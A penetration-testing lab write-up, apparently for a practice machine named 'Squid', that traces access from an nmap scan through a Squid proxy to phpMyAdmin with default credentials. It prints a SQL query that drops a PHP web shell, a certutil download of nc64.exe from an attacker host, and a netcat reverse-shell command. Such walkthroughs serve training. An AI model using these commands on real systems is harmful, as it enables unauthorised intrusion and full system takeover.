---
icon: windows
---

# Squid - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.139.189 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 09:11 EDT
Nmap scan report for 192.168.139.189
Host is up (0.030s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-28T13:13:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   31.78 ms 192.168.45.1
2   31.69 ms 192.168.45.254
3   31.87 ms 192.168.251.1
4   31.87 ms 192.168.139.189
```

### <mark style="color:$primary;">HTTP Port 3128 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

The website confirms the version we discovered on the nmap scan as well. I am going to try and find an exploit

<figure><img src="../../.gitbook/assets/image (1201).png" alt=""><figcaption></figcaption></figure>

Nothing matches our description! I will have to check this Squid proxy manually, I will use [**spose**](https://github.com/aancw/spose) for this process:

```
python3 spose.py --proxy http://192.168.139.189:3128 --target 192.168.139.189
```

<figure><img src="../../.gitbook/assets/image (1202).png" alt=""><figcaption></figcaption></figure>

We found a new open port 8080. I will setup a proxy using foxyproxy on 192.168.139.189:3128 so that I can access port 8080

<figure><img src="../../.gitbook/assets/image (1203).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1204).png" alt=""><figcaption></figcaption></figure>

There are some interesting links on the bottom. I am going to take a look

<figure><img src="../../.gitbook/assets/image (1205).png" alt=""><figcaption></figcaption></figure>

Found the website's root directory, this is goot to know!

<figure><img src="../../.gitbook/assets/image (1206).png" alt=""><figcaption></figcaption></figure>

For phpMyadmin default credentials work: root username and an empty password

<figure><img src="../../.gitbook/assets/image (1207).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SQL RCE -> administrator</mark>

We can perform SQL querries, I am going to use a SQL query to place a simple php shell in the root directory and try to access it.

```
select '<?php system($_GET["cmd"]); ?>;' into outfile 'C:/wamp/www/shell.php'; 
```

<figure><img src="../../.gitbook/assets/image (1208).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1210).png" alt=""><figcaption></figcaption></figure>

it worked and we are in the root directory! I am going to place nc64.exe in the root directory and use it to get a reverse shell as administrator!

```
certutil -urlcache -f http://192.168.45.158/nc64.exe nc64.exe
```

<figure><img src="../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>

And now to get a reverse shell!

```
nc64.exe 192.168.45.158 135 -e cmd.exe
```

<figure><img src="../../.gitbook/assets/image (1213).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>

We got a shell as Admin let's go!
